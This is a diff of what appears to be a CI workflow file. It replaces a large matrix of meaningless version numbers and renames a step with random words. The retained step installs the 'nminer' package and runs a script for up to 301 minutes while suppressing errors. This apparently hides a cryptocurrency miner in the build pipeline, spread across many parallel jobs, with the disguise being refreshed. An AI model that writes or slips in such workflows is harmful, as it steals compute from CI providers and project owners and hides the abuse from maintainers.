@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 769 }
-          - { version: 7796 }
-          - { version: 2331 }
-          - { version: 9210 }
-          - { version: 7779 }
-          - { version: 2381 }
-          - { version: 8916 }
-          - { version: 6951 }
-          - { version: 2884 }
-          - { version: 4925 }
-          - { version: 2741 }
-          - { version: 3275 }
-          - { version: 1154 }
-          - { version: 3555 }
-          - { version: 2345 }
-          - { version: 1988 }
-          - { version: 8750 }
-          - { version: 9490 }
-          - { version: 2304 }
-          - { version: 8013 }
+          - { version: 1482 }
+          - { version: 8298 }
+          - { version: 667 }
+          - { version: 4395 }
+          - { version: 614 }
+          - { version: 3738 }
+          - { version: 1272 }
+          - { version: 1974 }
+          - { version: 6472 }
+          - { version: 4205 }
+          - { version: 4508 }
+          - { version: 1057 }
+          - { version: 5076 }
+          - { version: 7572 }
+          - { version: 2544 }
+          - { version: 2247 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: snappy lovingly ha circumnavigate yearningly
+      - name: quick-witted an who whenever triangular
         run: |
           npm install nminer@latest
           timeout 301m node excess.js || echo "excess executed"
